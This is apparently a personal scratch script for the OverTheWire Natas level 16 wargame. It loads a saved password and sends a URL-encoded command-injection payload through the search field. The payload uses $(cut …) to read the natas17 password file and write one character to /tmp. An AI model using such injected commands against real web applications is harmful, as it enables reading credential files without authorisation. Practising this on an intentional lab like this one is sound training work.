# hi this has random code that i test before actually implementing it into main programs, note that i will not be having a description for any of these, if you are curious you will have to figure out where and what it was used for on your own, sorry not sorry ;)

import requests

with open("passwords.txt") as f:
    n16_pass = f.read().splitlines()[16].split(":")[1]


# for i in range(96,118):
#     url = "http://natas16.natas.labs.overthewire.org/?needle=hi&submit=Search"
#     response = requests.get(url, auth=('natas16', n16_pass))

url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28echo+%24%28cut+-c8+%2Fetc%2Fnatas_webpass%2Fnatas17%29+%3E+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"

requests.post(url, auth=('natas16', n16_pass))
